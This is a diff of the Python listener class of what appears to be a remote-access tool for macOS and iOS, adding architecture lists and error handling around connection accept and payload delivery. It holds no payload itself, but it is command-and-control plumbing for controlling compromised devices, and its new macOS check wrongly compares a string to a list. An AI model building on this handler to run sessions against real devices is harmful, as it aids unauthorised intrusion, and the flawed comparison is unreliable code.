@@ -11,6 +11,8 @@ class Server:
     def __init__(self):
         if not os.path.isdir("downloads"):
             os.makedirs("downloads")
+        self.macos_architectures = ["i386"]
+        self.ios_architectures = ["arm64","armv7s"]
         self.host = None
         self.port = None
         self.debug = False
@@ -36,9 +38,9 @@ class Server:
 
 
     def get_modules(self,session):
-        if session.type == "i386": 
+        if session.type == self.macos_architectures: 
             result = self.modules_macos
-        elif session.type == "arm64":
+        elif session.type in self.ios_architectures:
             result = self.modules_ios
         else:
             result = self.modules_python
@@ -71,15 +73,13 @@ class Server:
             self.port = lport
             return True
         except KeyboardInterrupt:
-            return False
+            return
 
 
     def start_single_handler(self):
         session = self.listen(False)
         if session:
             session.interact()
-        else:
-            print "rip"
 
 
     def start_multi_handler(self):
@@ -149,8 +149,12 @@ class Server:
         s.listen(1)
         if is_multi == False:
             h.info_general("Listening on port "+str(self.port)+"...")
+        try:
+            conn, addr = s.accept()
+        except KeyboardInterrupt:
+            s.close()
+            return
 
-        conn, addr = s.accept()
         hostAddress = addr[0]
         if is_multi == False:
             h.info_general("Connecting to "+hostAddress)
@@ -173,7 +177,14 @@ class Server:
         conn.close()
         if is_multi == False:
             h.info_general("Establishing Secure Connection...")
-        return self.listen_for_executable_payload(s,device_type,is_multi)
+        try:
+            return self.listen_for_executable_payload(s,device_type,is_multi)
+        except ssl.SSLError as e:
+            h.info_error("SSL error: " + str(e))
+            return
+        except Exception as e:
+            h.info_error("Error: " + str(e))
+            return
 
 
     def listen_for_executable_payload(self,s,device_type,is_multi):
